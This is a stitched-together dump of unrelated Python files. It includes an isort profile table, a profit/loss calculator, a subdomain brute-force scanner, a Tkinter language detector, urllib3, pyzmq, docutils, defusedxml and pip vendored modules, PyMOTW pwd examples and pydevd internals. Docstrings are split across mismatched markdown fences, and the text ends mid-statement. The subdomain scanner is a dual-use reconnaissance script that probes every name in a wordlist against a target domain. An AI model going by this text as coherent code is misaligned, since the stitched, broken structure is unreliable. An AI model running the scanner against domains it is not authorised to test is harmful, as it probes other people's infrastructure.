    "order_by_type": False,
    "case_sensitive": False,
    "reverse_relative": True,
    "sort_relative_in_force_sorted_sections": True,
    "sections": ["FUTURE", "STDLIB", "THIRDPARTY", "FIRSTPARTY", "APPLICATION", "LOCALFOLDER"],
    "no_lines_before": "LOCALFOLDER",
}

profiles: Dict[str, Dict[str, Any]] = {
    "black": black,
    "django": django,
    "pycharm": pycharm,
    "google": google,
    "open_stack": open_stack,
    "plone": plone,
    "attrs": attrs,
    "hug": hug,
    "wemake": wemake,
    "appnexus": appnexus,
}

# Profit Loss Calculator


def profit(sellP, costP):
    profit = sellP - costP
    return profit  # Function for calculating profit


def loss(costP, sellP):
    loss = costP - sellP
    return loss  # Function for calculating loss


def profitPercent(prof, costP):
    profitPerc = prof / costP * 100
    return str(profitPerc) + "%"  # func to calculate profit percent


def lossPercent(loss, costP):
    lossPerc = loss / costP * 100
    return str(lossPerc) + "%"  # Func to calculate loss percent


print("Hello\n")
print("Press Enter To Exit")
while True:
    google = str(input("Profit or Loss : "))
    if google.strip() == "Profit":  # condition for profit
        sellPrice = float(input("Selling Price : "))  # getting selling price
        costPrice = float(input("Cost Price : "))  # getting costprice
        if sellPrice > costPrice:  # if selling price is greater than cp
            print("Profit : " + str(profit(sellPrice, costPrice)))
            print(
                "Profit Percent : "
                + str(profitPercent(profit(sellPrice, costPrice), costPrice))
            )
            continue
        else:  # else if sp is less than cp so it is loss
            print("Cost Price is Greater Than Selling Price")
            print("Try calculating loss\n")
            continue
    elif google.strip() == "Loss":
        costPrice = float(input("Cost Price : "))
        sellPrice = float(input("Selling Price : "))
        if costPrice > sellPrice:
            print("Loss : " + str(loss(costPrice, sellPrice)))
            print(
                "Loss Percent : "
                + str(lossPercent(loss(costPrice, sellPrice), costPrice))
            )
            continue
        else:
            print("Selling Price is Greater Than Cost Price")
            print("Try calculating profit\n")
            continue
    else:
        quit()

import requests

# the domain to scan for subdomains
domain = "email.com"
# read all subdomains
file = open("subdomains.txt")
# read all content
content = file.read()
# split by new lines
subdomains = content.splitlines()
# a list of discovered subdomains
discovered_subdomains = []
for subdomain in subdomains:
    # construct the url
    url = f"http://{subdomain}.{domain}"
    try:
        # if this raises an ERROR, that means the subdomain does not exist
        requests.get(url)
    except requests.ConnectionError:
        # if the subdomain does not exist, just pass, print nothing
        pass
    else:
        print("[+] Discovered subdomain:", url)
        # append the discovered subdomain to our list
        discovered_subdomains.append(url)
# save the discovered subdomains into a file
with open("discovered_subdomains.txt", "w") as f:
    for subdomain in discovered_subdomains:
        print(subdomain, file=f)

# Programming Language Detector

# imported necessary library
import tkinter
from tkinter import *
import tkinter as tk
import tkinter.messagebox as mbox
import re

# created main window
window = Tk()
window.geometry("1000x700")
window.title("Programming Language Detector")


# extracting url -------------------------
def extract_url():
    global detected_language
    input_text = str(text_enter.get("1.0", "end-1c"))
    if re.search(r'public static void main\(String args\[\]\)|System\.out\.println|import java\..+?;', input_text):
        detected_language = 'Java'
    elif re.search(r'#include<stdio.h>', input_text):
        detected_language = 'C'
    elif re.search(r'#include<iostream.h>', input_text):
        detected_language = 'C++'
    elif re.search(r'using System;', input_text):
        detected_language = 'C#'
    elif re.search(r'<!DOCTYPE html>', input_text):
        detected_language = 'HTML'
    elif re.search(r'<html>', input_text):
        detected_language = 'HTML'
    elif re.search(r'fun', input_text):
        detected_language = 'Kotlin'
    elif re.search(r'<script>', input_text):
        detected_language = 'JavaScript'
    else:
        detected_language = 'Python'
    mbox.showinfo("Detected Language", "Detected Programming Language :\n\n" + detected_language)


def lang_support():
    mbox.showinfo("Supported Programming Language", "Supported Programming Language :\n\nC\nC++\nJava\nPython\nHTML\nKolin\nJavaScript\nC#")


# top label
start1 = tk.Label(text="Programming Lang. Detector", font=("Arial", 50), fg="magenta")  # same way bg
start1.place(x=60, y=10)

# top second label
enter_label = Label(window, text="Write code snippets and detect...", font=("Arial", 30), fg="brown")
enter_label.place(x=180, y=100)

# created text area
text_enter = tk.Text(window, height=18, width=80, font=("Arial", 15), bg="light yellow", fg="brown", borderwidth=3,
                     relief="solid")
text_enter.place(x=50, y=150)

# created extract domain button
domainb = Button(window, text="LANG. SUPPORT", command=lang_support, font=("Arial", 20), bg="light green", fg="blue",
                 borderwidth=3, relief="raised")
domainb.place(x=50, y=600)

# created extract url button
extractb = Button(window, text="DETECT LANG.", command=extract_url, font=("Arial", 20), bg="light green", fg="blue",
                  borderwidth=3, relief="raised")
extractb.place(x=360, y=600)


# function for clearing the text area
def clear_text():
    text_enter.delete("1.0", "end")


# created a clear button
clearb = Button(window, text="CLEAR", command=clear_text, font=("Arial", 20), bg="orange", fg="blue", borderwidth=3,
                relief="raised")
clearb.place(x=660, y=600)


# function for exiting
def exit_win():
    if mbox.askokcancel("Exit", "Do you want to exit?"):
        window.destroy()


# created exit button
exitb = Button(window, text="EXIT", command=exit_win, font=("Arial", 20), bg="red", fg="blue", borderwidth=3,
               relief="raised")
exitb.place(x=850, y=600)

window.protocol("WM_DELETE_WINDOW", exit_win)
window.mainloop()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Student(object):
    def __init__(self, name, score):
        self.__name = name
        self.__score = score

    def get_name(self):
        return self.__name

    def get_score(self):
        return self.__score

    def set_score(self, score):
        if 0 <= score <= 100:
            self.__score = score
        else:
            raise ValueError("bad score")

    def get_grade(self):
        if self.__score >= 90:
            return "A"
        elif self.__score >= 60:
            return "B"
        else:
            return "C"


bart = Student("Bart Simpson", 59)
print("bart.get_name() =", bart.get_name())
bart.set_score(60)
print("bart.get_score() =", bart.get_score())

print("DO NOT use bart._Student__name:", bart._Student__name)

from .ssl_ import create_urllib3_context, resolve_cert_reqs, resolve_ssl_version


def connection_requires_http_tunnel(
    proxy_url=None, proxy_config=None, destination_scheme=None
):
    """
    Returns True if the connection requires an HTTP CONNECT through the proxy.

    :param URL proxy_url:
        URL of the proxy.
    :param ProxyConfig proxy_config:
        Proxy configuration from poolmanager.py
    :param str destination_scheme:
        The scheme of the destination. (i.e https, http, etc)
    """
    # If we're not using a proxy, no way to use a tunnel.
    if proxy_url is None:
        return False

    # HTTP destinations never require tunneling, we always forward.
    if destination_scheme == "http":
        return False

    # Support for forwarding with HTTPS proxies and HTTPS destinations.
    if (
        proxy_url.scheme == "https"
        and proxy_config
        and proxy_config.use_forwarding_for_https
    ):
        return False

    # Otherwise always use a tunnel.
    return True


def create_proxy_ssl_context(
    ssl_version, cert_reqs, ca_certs=None, ca_cert_dir=None, ca_cert_data=None
):
    """
    Generates a default proxy ssl context if one hasn't been provided by the
    user.
    """
    ssl_context = create_urllib3_context(
        ssl_version=resolve_ssl_version(ssl_version),
        cert_reqs=resolve_cert_reqs(cert_reqs),
    )
    if (
        not ca_certs
        and not ca_cert_dir
        and not ca_cert_data
        and hasattr(ssl_context, "load_default_certs")
    ):
        ssl_context.load_default_certs()

    return ssl_context
```

```pyProxy classes and functions."""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import zmq
from zmq.devices.basedevice import Device, ThreadDevice, ProcessDevice


class ProxyBase(object):
    """Base class for overriding methods."""

    def __init__(self, in_type, out_type, mon_type=zmq.PUB):

        Device.__init__(self, in_type=in_type, out_type=out_type)
        self.mon_type = mon_type
        self._mon_binds = []
        self._mon_connects = []
        self._mon_sockopts = []

    def bind_mon(self, addr):
        """Enqueue ZMQ address for binding on mon_socket.

        See zmq.Socket.bind for details.
        """
        self._mon_binds.append(addr)

    def bind_mon_to_random_port(self, addr, *args, **kwargs):
        """Enqueue a random port on the given interface for binding on
        mon_socket.

        See zmq.Socket.bind_to_random_port for details.

        .. versionadded:: 18.0
        """
        port = self._reserve_random_port(addr, *args, **kwargs)

        self.bind_mon('%s:%i' % (addr, port))

        return port

    def connect_mon(self, addr):
        """Enqueue ZMQ address for connecting on mon_socket.

        See zmq.Socket.connect for details.
        """
        self._mon_connects.append(addr)

    def setsockopt_mon(self, opt, value):
        """Enqueue setsockopt(opt, value) for mon_socket

        See zmq.Socket.setsockopt for details.
        """
        self._mon_sockopts.append((opt, value))

    def _setup_sockets(self):
        ins, outs = Device._setup_sockets(self)
        ctx = self._context
        mons = ctx.socket(self.mon_type)

        # set sockopts (must be done first, in case of zmq.IDENTITY)
        for opt, value in self._mon_sockopts:
            mons.setsockopt(opt, value)

        for iface in self._mon_binds:
            mons.bind(iface)

        for iface in self._mon_connects:
            mons.connect(iface)

        return ins, outs, mons

    def run_device(self):
        ins, outs, mons = self._setup_sockets()
        zmq.proxy(ins, outs, mons)


class Proxy(ProxyBase, Device):
    """Threadsafe Proxy object.

    See zmq.devices.Device for most of the spec. This subclass adds a
    <method>_mon version of each <method>_{in|out} method, for configuring the
    monitor socket.

    A Proxy is a 3-socket ZMQ Device that functions just like a
    QUEUE, except each message is also sent out on the monitor socket.

    A PUB socket is the most logical choice for the mon_socket, but it is not required.
    """

    pass


class ThreadProxy(ProxyBase, ThreadDevice):
    """Proxy in a Thread. See Proxy for more."""

    pass


class ProcessProxy(ProxyBase, ProcessDevice):
    """Proxy in a Process. See Proxy for more."""

    pass


__all__ = [
    'Proxy',
    'ThreadProxy',
    'ProcessProxy',
]

import errno
import subprocess
import sys

from ._core import Process


class PsNotAvailable(EnvironmentError):
    pass


def get_process_mapping():
    """Try to look up the process tree via the output of `ps`.
    """
    try:
        output = subprocess.check_output([
            'ps', '-ww', '-o', 'pid=', '-o', 'ppid=', '-o', 'args=',
        ])
    except OSError as e:    # Python 2-compatible FileNotFoundError.
        if e.errno != errno.ENOENT:
            raise
        raise PsNotAvailable('ps not found')
    except subprocess.CalledProcessError as e:
        # `ps` can return 1 if the process list is completely empty.
        # (sarugaku/shellingham#15)
        if not e.output.strip():
            return {}
        raise
    if not isinstance(output, str):
        encoding = sys.getfilesystemencoding() or sys.getdefaultencoding()
        output = output.decode(encoding)
    processes = {}
    for line in output.split('\n'):
        try:
            pid, ppid, args = line.strip().split(None, 2)
            # XXX: This is not right, but we are really out of options.
            # ps does not offer a sane way to decode the argument display,
            # and this is "Good Enough" for obtaining shell names. Hopefully
            # people don't name their shell with a space, or have something
            # like "/usr/bin/xonsh is uber". (sarugaku/shellingham#14)
            args = tuple(a.strip() for a in args.split(' '))
        except ValueError:
            continue
        processes[pid] = Process(args=args, pid=pid, ppid=ppid)
    return processes

# $Id: pseudoxml.py 8592 2020-12-15 23:06:26Z milde $
# Author: David Goodger <goodger@python.org>
# Copyright: This module has been placed in the public domain.
```

````py
Simple internal document tree Writer, writes indented pseudo-XML.```


```py

__docformat__ = 'reStructuredText'


from docutils import writers, frontend


class Writer(writers.Writer):

    supported = ('pprint', 'pformat', 'pseudoxml')
    """Formats this writer supports."""

    settings_spec = (
        '"Docutils pseudo-XML" Writer Options',
        None,
        (('Pretty-print <#text> nodes.',
          ['--detailled'],
          {'action': 'store_true', 'validator': frontend.validate_boolean}),
        ))

    config_section = 'pseudoxml writer'
    config_section_dependencies = ('writers',)

    output = None
    """Final translated form of `document`."""

    def translate(self):
        self.output = self.document.pformat()

    def supports(self, format):
        """This writer supports all format-specific elements."""
        return True

# $Id: pt_br.py 5567 2008-06-03 01:11:03Z goodger $
# Author: David Goodger <goodger@python.org>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Brazilian Portuguese-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = 'reStructuredText'

labels = {
      # fixed: language-dependent
      'author': u'Autor',
      'authors': u'Autores',
      'organization': u'Organiza\u00E7\u00E3o',
      'address': u'Endere\u00E7o',
      'contact': u'Contato',
      'version': u'Vers\u00E3o',
      'revision': u'Revis\u00E3o',
      'status': u'Estado',
      'date': u'Data',
      'copyright': u'Copyright',
      'dedication': u'Dedicat\u00F3ria',
      'abstract': u'Resumo',
      'attention': u'Aten\u00E7\u00E3o!',
      'caution': u'Cuidado!',
      'danger': u'PERIGO!',
      'error': u'Erro',
      'hint': u'Sugest\u00E3o',
      'important': u'Importante',
      'note': u'Nota',
      'tip': u'Dica',
      'warning': u'Aviso',
      'contents': u'Sum\u00E1rio'}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
      # language-dependent: fixed
      u'autor': 'author',
      u'autores': 'authors',
      u'organiza\u00E7\u00E3o': 'organization',
      u'endere\u00E7o': 'address',
      u'contato': 'contact',
      u'vers\u00E3o': 'version',
      u'revis\u00E3o': 'revision',
      u'estado': 'status',
      u'data': 'date',
      u'copyright': 'copyright',
      u'dedicat\u00F3ria': 'dedication',
      u'resumo': 'abstract'}```


```pyBrazilian Portuguese (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [';', ',']```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

# defusedxml
#
# Copyright (c) 2013 by Christian Heimes <christian@python.org>
# Licensed to PSF under a Contributor Agreement.
# See https://www.python.org/psf/license for licensing details.```


```pyDefused xml.dom.pulldom```


```py
from __future__ import print_function, absolute_import

from xml.dom.pulldom import parse as _parse
from xml.dom.pulldom import parseString as _parseString
from .sax import make_parser

__origin__ = "xml.dom.pulldom"


def parse(
    stream_or_string,
    parser=None,
    bufsize=None,
    forbid_dtd=False,
    forbid_entities=True,
    forbid_external=True,
):
    if parser is None:
        parser = make_parser()
        parser.forbid_dtd = forbid_dtd
        parser.forbid_entities = forbid_entities
        parser.forbid_external = forbid_external
    return _parse(stream_or_string, parser, bufsize)


def parseString(
    string, parser=None, forbid_dtd=False, forbid_entities=True, forbid_external=True
):
    if parser is None:
        parser = make_parser()
        parser.forbid_dtd = forbid_dtd
        parser.forbid_entities = forbid_entities
        parser.forbid_external = forbid_external
    return _parseString(string, parser)

PC = 0
SP = 5

operation_size = 2


memory_stack = [0] * 10
register = [0] * 10

register[7] = 5

reg1 = 12
reg2 = 23
reg3 = 0
reg7 = 5
SP = 7
# PUSH, 2
register[SP] -= 1 # step 1
memory_stack[register[SP]] = register[2]  # step 2

# POP, 3
register[3] = memory_stack[register[SP]]  # step 1
register[SP] += 1 # Step 2


PC += operation_size

# Copyright 2013 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py



#end_pymotw_header
import pwd
import operator

# Load all of the user data, sorted by username
all_user_data = pwd.getpwall()
interesting_users = sorted(
    (u for u in all_user_data
     if not u.pw_name.startswith('_')),
    key=operator.attrgetter('pw_name')
)

# Find the longest lengths for a few fields
username_length = max(len(u.pw_name)
                      for u in interesting_users) + 1
home_length = max(len(u.pw_dir)
                  for u in interesting_users) + 1
uid_length = max(len(str(u.pw_uid))
                 for u in interesting_users) + 1

# Print report headers
fmt = ' '.join(['{:<{username_length}}',
                '{:>{uid_length}}',
                '{:<{home_length}}',
                '{}'])
print(fmt.format('User',
                 'UID',
                 'Home Dir',
                 'Description',
                 username_length=username_length,
                 uid_length=uid_length,
                 home_length=home_length))
print('-' * username_length,
      '-' * uid_length,
      '-' * home_length,
      '-' * 20)

# Print the data
for u in interesting_users:
    print(fmt.format(u.pw_name,
                     u.pw_uid,
                     u.pw_dir,
                     u.pw_gecos,
                     username_length=username_length,
                     uid_length=uid_length,
                     home_length=home_length))

# Copyright 2013 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py


#end_pymotw_header
import pwd
import sys

username = sys.argv[1]
user_info = pwd.getpwnam(username)

print('Username:', user_info.pw_name)
print('Password:', user_info.pw_passwd)
print('Comment :', user_info.pw_gecos)
print('UID/GID :', user_info.pw_uid, '/', user_info.pw_gid)
print('Home    :', user_info.pw_dir)
print('Shell   :', user_info.pw_shell)

# Copyright 2013 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

#

#end_pymotw_header
import pwd
import os

filename = 'pwd_getpwuid_fileowner.py'
stat_info = os.stat(filename)
owner = pwd.getpwuid(stat_info.st_uid).pw_name

print('{} is owned by {} ({})'.format(
    filename, owner, stat_info.st_uid))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


#end_pymotw_header
import pwd
import os

uid = os.getuid()
user_info = pwd.getpwuid(uid)
print('Currently running with UID={} username={}'.format(
    uid, user_info.pw_name))

from __future__ import absolute_import, division, unicode_literals
from pip._vendor.six import text_type

from bisect import bisect_left

from ._base import Trie as ABCTrie


class Trie(ABCTrie):
    def __init__(self, data):
        if not all(isinstance(x, text_type) for x in data.keys()):
            raise TypeError("All keys must be strings")

        self._data = data
        self._keys = sorted(data.keys())
        self._cachestr = ""
        self._cachepoints = (0, len(data))

    def __contains__(self, key):
        return key in self._data

    def __len__(self):
        return len(self._data)

    def __iter__(self):
        return iter(self._data)

    def __getitem__(self, key):
        return self._data[key]

    def keys(self, prefix=None):
        if prefix is None or prefix == "" or not self._keys:
            return set(self._keys)

        if prefix.startswith(self._cachestr):
            lo, hi = self._cachepoints
            start = i = bisect_left(self._keys, prefix, lo, hi)
        else:
            start = i = bisect_left(self._keys, prefix)

        keys = set()
        if start == len(self._keys):
            return keys

        while self._keys[i].startswith(prefix):
            keys.add(self._keys[i])
            i += 1

        self._cachestr = prefix
        self._cachepoints = (start, i)

        return keys

    def has_keys_with_prefix(self, prefix):
        if prefix in self._data:
            return True

        if prefix.startswith(self._cachestr):
            lo, hi = self._cachepoints
            i = bisect_left(self._keys, prefix, lo, hi)
        else:
            i = bisect_left(self._keys, prefix)

        if i == len(self._keys):
            return False

        return self._keys[i].startswith(prefix)

from . import py35, py36, py37, py38, py39

stdlib = py35.stdlib | py36.stdlib | py37.stdlib | py38.stdlib | py39.stdlib

import os
import errno
import sys

from pip._vendor import six


def _makedirs_31(path, exist_ok=False):
    try:
        os.makedirs(path)
    except OSError as exc:
        if not exist_ok or exc.errno != errno.EEXIST:
            raise


# rely on compatibility behavior until mode considerations
#  and exists_ok considerations are disentangled.
# See https://github.com/pypa/setuptools/pull/1083#issuecomment-315168663
needs_makedirs = six.PY2 or (3, 4) <= sys.version_info < (3, 4, 1)
makedirs = _makedirs_31 if needs_makedirs else os.makedirs

import importlib

try:
    import importlib.util
except ImportError:
    pass


try:
    module_from_spec = importlib.util.module_from_spec
except AttributeError:

    def module_from_spec(spec):
        return spec.loader.load_module(spec.name)

import sys
import subprocess


def __optim_args_from_interpreter_flags():
    """Return a list of command-line arguments reproducing the current
    optimization settings in sys.flags."""
    args = []
    value = sys.flags.optimize
    if value > 0:
        args.append("-" + "O" * value)
    return args


_optim_args_from_interpreter_flags = getattr(
    subprocess,
    "_optim_args_from_interpreter_flags",
    __optim_args_from_interpreter_flags,
)

import sys


def _pythonlib_compat():
    """
    On Python 3.7 and earlier, distutils would include the Python
    library. See pypa/distutils#9.
    """
    from distutils import sysconfig

    if not sysconfig.get_config_var("Py_ENABLED_SHARED"):
        return

    yield "python{}.{}{}".format(
        sys.hexversion >> 24,
        (sys.hexversion >> 16) & 0xFF,
        sysconfig.get_config_var("ABIFLAGS"),
    )


def compose(f1, f2):
    return lambda *args, **kwargs: f1(f2(*args, **kwargs))


pythonlib = (
    compose(list, _pythonlib_compat)
    if sys.version_info < (3, 8)
    and sys.platform != "darwin"
    and sys.platform[:3] != "aix"
    else list
)

def aix_platform(osname, version, release):
    try:
        import _aix_support

        return _aix_support.aix_platform()
    except ImportError:
        pass
    return "%s-%s.%s" % (osname, version, release)

# Checking is some keyword is a python keyword or not
import keyword

pythonKeywords = keyword.kwlist
getToCheck = str(input("Keyword to check : "))
check = keyword.iskeyword(getToCheck)
if check == True:
    print(getToCheck + " is a python keyword.")
else:
    print(getToCheck + " is not a python keyword.")

print("\nShowing all keywords in python : \n")
print(pythonKeywords)
# remember to test the code

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#
#end_pymotw_header```


```pyExample source for pyclbr.```


```py


class Base:
    """This is the base class.
    """

    def method1(self):
        return


class Sub1(Base):
    """This is the first subclass.
    """


class Sub2(Base):
    """This is the second subclass.
    """


class Mixin:
    """A mixin class.
    """

    def method2(self):
        return


class MixinUser(Sub2, Mixin):
    """Overrides method1 and method2
    """

    def method1(self):
        return

    def method2(self):
        return

    def method3(self):
        return


def my_function():
    """Stand-alone function.
    """
    return

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

#end_pymotw_header
import pyclbr
import os
from operator import itemgetter


def show_class(name, class_data):
    print('Class:', name)
    filename = os.path.basename(class_data.file)
    print('  File: {0} [{1}]'.format(
        filename, class_data.lineno))
    show_super_classes(name, class_data)
    show_methods(name, class_data)
    print()


def show_methods(class_name, class_data):
    for name, lineno in sorted(class_data.methods.items(),
                               key=itemgetter(1)):
        print('  Method: {0} [{1}]'.format(name, lineno))


def show_super_classes(name, class_data):
    super_class_names = []
    for super_class in class_data.super:
        if super_class == 'object':
            continue
        if isinstance(super_class, str):
            super_class_names.append(super_class)
        else:
            super_class_names.append(super_class.name)
    if super_class_names:
        print('  Super classes:', super_class_names)


example_data = pyclbr.readmodule('pyclbr_example')

for name, class_data in sorted(example_data.items(),
                               key=lambda x: x[1].lineno):
    show_class(name, class_data)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py

#end_pymotw_header
import pyclbr
import os
from operator import itemgetter

example_data = pyclbr.readmodule_ex('pyclbr_example')

for name, data in sorted(example_data.items(),
                         key=lambda x: x[1].lineno):
    if isinstance(data, pyclbr.Function):
        print('Function: {0} [{1}]'.format(name, data.lineno))
````

````py
    sphinx.util.pycompat
    ~~~~~~~~~~~~~~~~~~~~

    Stuff for Python version compatibility.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

import warnings
from typing import Any, Callable

from sphinx.deprecation import RemovedInSphinx60Warning

# ------------------------------------------------------------------------------
# Python 2/3 compatibility


# convert_with_2to3():
# support for running 2to3 over config files
def convert_with_2to3(filepath: str) -> str:
    warnings.warn('convert_with_2to3() is deprecated',
                  RemovedInSphinx60Warning, stacklevel=2)

    try:
        from lib2to3.pgen2.parse import ParseError
        from lib2to3.refactor import RefactoringTool, get_fixers_from_package
    except ImportError as exc:
        # python 3.9.0a6+ emits PendingDeprecationWarning for lib2to3.
        # Additionally, removal of the module is still discussed at PEP-594.
        # To support future python, this catches ImportError for lib2to3.
        raise SyntaxError from exc

    fixers = get_fixers_from_package('lib2to3.fixes')
    refactoring_tool = RefactoringTool(fixers)
    source = refactoring_tool._read_python_source(filepath)[0]
    try:
        tree = refactoring_tool.refactor_string(source, 'conf.py')
    except ParseError as err:
        # do not propagate lib2to3 exceptions
        lineno, offset = err.context[1]
        # try to match ParseError details with SyntaxError details

        raise SyntaxError(err.msg, (filepath, lineno, offset, err.value)) from err
    return str(tree)


def execfile_(filepath: str, _globals: Any, open: Callable = open) -> None:
    warnings.warn('execfile_() is deprecated',
                  RemovedInSphinx60Warning, stacklevel=2)
    from sphinx.util.osutil import fs_encoding
    with open(filepath, 'rb') as f:
        source = f.read()

    # compile to a code object, handle syntax errors
    filepath_enc = filepath.encode(fs_encoding)
    code = compile(source, filepath_enc, 'exec')
    exec(code, _globals)

if False:
    config = None


# See: https://docs.google.com/document/d/1CCSaRiIWCLgbD3OwmuKsRoHHDfBffbROWyVWWL0ZXN4/edit
if ':' not in config.version_id:
    # The default server version_id does not contain ':'
    import json
    import os
    import sys

    startup = config.python_config.startup_args
    if not startup:
        raise AssertionError('Expected --python_startup_args to be passed from the pydev debugger.')

    setup = json.loads(startup)
    pydevd_path = setup['pydevd']
    sys.path.append(os.path.dirname(pydevd_path))

    import pydevd
    pydevd.settrace(setup['client'], port=setup['port'], suspend=False, trace_only_current_thread=False)


import sys
import traceback
from types import ModuleType
from _pydevd_bundle.pydevd_constants import DebugInfoHolder

if sys.version_info[0] >= 3:
    import builtins  # py3
else:
    import __builtin__ as builtins


class ImportHookManager(ModuleType):

    def __init__(self, name, system_import):
        ModuleType.__init__(self, name)
        self._system_import = system_import
        self._modules_to_patch = {}

    def add_module_name(self, module_name, activate_function):
        self._modules_to_patch[module_name] = activate_function

    def do_import(self, name, *args, **kwargs):
        module = self._system_import(name, *args, **kwargs)
        try:
            activate_func = self._modules_to_patch.pop(name, None)
            if activate_func:
                activate_func()  # call activate function
        except:
            if DebugInfoHolder.DEBUG_TRACE_LEVEL >= 2:
                traceback.print_exc()

        # Restore normal system importer to reduce performance impact
        # of calling this method every time an import statement is invoked
        if not self._modules_to_patch:
            builtins.__import__ = self._system_import

        return module


import_hook_manager = ImportHookManager(__name__ + '.import_hook', builtins.__import__)
builtins.__import__ = import_hook_manager.do_import
sys.modules[import_hook_manager.__name__] = import_hook_manager

from _pydevd_bundle.pydevd_constants import USE_LIB_COPY, izip

try:
    try:
        if USE_LIB_COPY:
            from _pydev_imps._pydev_saved_modules import xmlrpclib
        else:
            import xmlrpclib
    except ImportError:
        import xmlrpc.client as xmlrpclib
except ImportError:
    from _pydev_imps import _pydev_xmlrpclib as xmlrpclib

try:
    try:
        if USE_LIB_COPY:
            from _pydev_imps._pydev_saved_modules import _pydev_SimpleXMLRPCServer
            from _pydev_SimpleXMLRPCServer import SimpleXMLRPCServer
        else:
            from SimpleXMLRPCServer import SimpleXMLRPCServer
    except ImportError:
        from xmlrpc.server import SimpleXMLRPCServer
except ImportError:
    from _pydev_imps._pydev_SimpleXMLRPCServer import SimpleXMLRPCServer

try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

try:
    execfile = execfile  # Not in Py3k
except NameError:
    from _pydev_imps._pydev_execfile import execfile

from _pydev_imps._pydev_saved_modules import _queue

try:
    from _pydevd_bundle.pydevd_exec import Exec
except:
    from _pydevd_bundle.pydevd_exec2 import Exec

try:
    from urllib import quote, quote_plus, unquote_plus
except:
    from urllib.parse import quote, quote_plus, unquote_plus  # @UnresolvedImport


from _pydev_imps._pydev_saved_modules import threading

# Hack for https://www.brainwy.com/tracker/PyDev/363 (i.e.: calling is_alive() can throw AssertionError under some
# circumstances).
# It is required to debug threads started by start_new_thread in Python 3.4
_temp = threading.Thread()
if hasattr(_temp, '_is_stopped'):  # Python 3.x has this

    def is_thread_alive(t):
        return not t._is_stopped

elif hasattr(_temp, '_Thread__stopped'):  # Python 2.x has this

    def is_thread_alive(t):
        return not t._Thread__stopped

else:

    # Jython wraps a native java thread and thus only obeys the public API.
    def is_thread_alive(t):
        return t.is_alive()

del _temp

from _pydevd_bundle import pydevd_constants
from _pydev_imps._pydev_saved_modules import socket
import sys

IS_JYTHON = sys.platform.find('java') != -1

_cache = None
def get_localhost():
    '''
    Should return 127.0.0.1 in ipv4 and ::1 in ipv6

    localhost is not used because on windows vista/windows 7, there can be issues where the resolving doesn't work
    properly and takes a lot of time (had this issue on the pyunit server).

    Using the IP directly solves the problem.
    '''
    # TODO: Needs better investigation!

    global _cache
    if _cache is None:
        try:
            for addr_info in socket.getaddrinfo("localhost", 80, 0, 0, socket.SOL_TCP):
                config = addr_info[4]
                if config[0] == '127.0.0.1':
                    _cache = '127.0.0.1'
                    return _cache
        except:
            # Ok, some versions of Python don't have getaddrinfo or SOL_TCP... Just consider it 127.0.0.1 in this case.
            _cache = '127.0.0.1'
        else:
            _cache = 'localhost'

    return _cache


def get_socket_names(n_sockets, close=False):
    socket_names = []
    sockets = []
    for _ in range(n_sockets):
        if IS_JYTHON:
            # Although the option which would be pure java *should* work for Jython, the socket being returned is still 0
            # (i.e.: it doesn't give the local port bound, only the original port, which was 0).
            from java.net import ServerSocket
            sock = ServerSocket(0)
            socket_name = get_localhost(), sock.getLocalPort()
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((get_localhost(), 0))
            socket_name = sock.getsockname()

        sockets.append(sock)
        socket_names.append(socket_name)

    if close:
        for s in sockets:
            s.close()
    return socket_names

def get_socket_name(close=False):
    return get_socket_names(1, close)[0]

if __name__ == '__main__':
    print(get_socket_name())
def overrides(method):
    '''
    Meant to be used as

    class B:
        @overrides(A.m1)
        def m1(self):
            pass
    '''
    def wrapper(func):
        if func.__name__ != method.__name__:
            msg = "Wrong @override: %r expected, but overwriting %r."
            msg = msg % (func.__name__, method.__name__)
            raise AssertionError(msg)

        if func.__doc__ is None:
            func.__doc__ = method.__doc__

        return func

    return wrapper

def implements(method):
    def wrapper(func):
        if func.__name__ != method.__name__:
            msg = "Wrong @implements: %r expected, but implementing %r."
            msg = msg % (func.__name__, method.__name__)
            raise AssertionError(msg)

        if func.__doc__ is None:
            func.__doc__ = method.__doc__

        return func

    return wrapper
import sys

def versionok_for_gui():
    ''' Return True if running Python is suitable for GUI Event Integration and deeper IPython integration '''
    # We require Python 2.6+ ...
    if sys.hexversion < 0x02060000:
        return False
    # Or Python 3.2+
    if sys.hexversion >= 0x03000000 and sys.hexversion < 0x03020000:
        return False
    # Not supported under Jython nor IronPython
    if sys.platform.startswith("java") or sys.platform.startswith('cli'):
        return False

    return True


# Defines which version of the PyDBAdditionalThreadInfo we'll use.
from _pydevd_bundle.pydevd_constants import ENV_FALSE_LOWER_VALUES, USE_CYTHON_FLAG, \
    ENV_TRUE_LOWER_VALUES

if USE_CYTHON_FLAG in ENV_TRUE_LOWER_VALUES:
    # We must import the cython version if forcing cython
    from _pydevd_bundle.pydevd_cython_wrapper import PyDBAdditionalThreadInfo, set_additional_thread_info, _set_additional_thread_info_lock  # @UnusedImport

elif USE_CYTHON_FLAG in ENV_FALSE_LOWER_VALUES:
    # Use the regular version if not forcing cython
    from _pydevd_bundle.pydevd_additional_thread_info_regular import PyDBAdditionalThreadInfo, set_additional_thread_info, _set_additional_thread_info_lock  # @UnusedImport @Reimport

else:
    # Regular: use fallback if not found (message is already given elsewhere).
    try:
